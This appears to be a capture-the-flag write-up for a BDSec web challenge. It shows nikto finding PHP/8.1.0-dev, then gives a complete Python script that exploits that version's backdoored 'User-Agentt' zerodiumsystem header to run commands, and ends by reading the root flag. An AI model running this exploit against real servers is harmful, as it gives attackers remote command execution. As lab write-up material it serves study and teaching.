# BDSec 
## WEB category
### Can You See Me 50 Point
- Found URL : http://139.144.184.115:8989/
- running nikto found :
    ```Retrieved x-powered-by header: PHP/8.1.0-dev```
- exploit the PHP/8.1.0-dev
    ```python
    #!/usr/bin/env python3
    import os
    import re
    import requests

    host = "http://139.144.184.115:8989" #input("Enter the host url:\n")
    request = requests.Session()
    response = request.get(host)

    if str(response) == '<Response [200]>':
        print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
        try:
            while 1:
                cmd = input("$ ")
                headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                "User-Agentt": "zerodiumsystem('" + cmd + "');"
                }
                response = request.get(host, headers = headers, allow_redirects = False)
                current_page = response.text
                stdout = current_page.split('<!DOCTYPE html>',1)
                text = print(stdout[0])
        except KeyboardInterrupt:
            print("Exiting...")
            exit

    else:
        print("\r")
        print(response)
        print("Host is not available, aborting...")
        exit
    ```
- receive the SHELL:
    ```bash
    $ cat /root/flag.txt
    BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}
    ```

[![Thumbnail](https://img.youtube.com/vi/igtDxvz-CpA/0.jpg)](https://www.youtube.com/watch?v=igtDxvz-CpA)
